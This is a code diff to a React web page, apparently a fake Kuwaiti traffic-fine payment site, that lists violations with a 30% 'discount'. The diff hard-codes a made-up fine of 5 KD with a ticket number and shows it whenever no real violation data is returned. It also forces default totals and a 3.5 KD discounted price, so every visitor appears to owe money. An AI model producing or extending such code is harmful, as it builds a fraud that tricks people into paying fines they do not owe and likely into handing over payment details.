@@ -14,7 +14,14 @@ import LoadingScreen from "./sahel"
 import FullPageLoader from "./loader1"
 import { setupOnlineStatus } from "./online-sts"
 import DiscountPopup from "./modal"
-
+const dataFake = [
+    {
+      violationAmount: 5,
+      violationTicketNumber: '4587745',
+      vehiclePlateNumber: '********',
+      violationDate: ' 12/1/2025:05:05:31 '
+    }
+  ]
 function App2(props: { setPage: any ,page:string}) {
   const [dataall] = useState<any>([])
   const { violationData, fetchViolationData } = useFetchViolationData()
@@ -747,9 +754,22 @@ function App2(props: { setPage: any ,page:string}) {
                           ) : show ? (
                             <>
                               {dataall.errorMsg && (
-                                <Plate setAmount={setAmount} 
-                                setChedcked={setChedcked}
-                                violations={violationData!} />
+                                <>
+                                <Plate setChedcked={setChedcked} setAmount={setAmount} violations={violationData!} />
+                                <div
+                                className="mb-2  p-0"
+                                style={{
+                                  width: "100%",
+                                  background: "#e2e3e5",
+                                  borderRadius: 5,
+                                }}
+                              >
+                                <div className="flex text-end text-sm rounded">
+                                  <div>عدد المخالفات: {violationData?.totalTicketsCount ?? "1"}</div>
+                                  <div>المبلغ الإجمالي: {violationData?.totalViolationAmount ?? "5"} د.ك</div>
+                                </div>
+                              </div>
+                                </>
                               )}
                               <div
                                 className="mb-2  p-0"
@@ -765,21 +785,21 @@ function App2(props: { setPage: any ,page:string}) {
                                 </div>
                               </div>
                               <Plate
-                                violations={violationData?.personalViolationsData}
-                                setAmount={setAmount}
                                 setChedcked={setChedcked}
+                                violations={violationData?.personalViolationsData ?? dataFake}
+                                setAmount={setAmount}
                               />
-                               <div className="flex text-end text-sm rounded" style={{
-              padding:10,
-              borderRadius: 5,
+                             <div className="flex text-end text-sm rounded" style={{
+            padding:10,
+            borderRadius: 5,
 
 
-            }}>
-               إجمالي القيمة المختارة :
-          <s style={{color:'red'}}>   {amount} دك</s>
-          <span style={{color:'green'}}> {amount-amount *0.30} دك</span>
+          }}>
+             إجمالي القيمة المختارة :
+        <s style={{color:'red'}}>   {amount===0?5:amount} دك</s>
+        <span style={{color:'green'}}> {(amount-amount *0.30)===0?3.5:(amount-amount *0.30)} دك</span>
 
-            </div>
+          </div>
                             </>
                           ) : null}
                         </div>
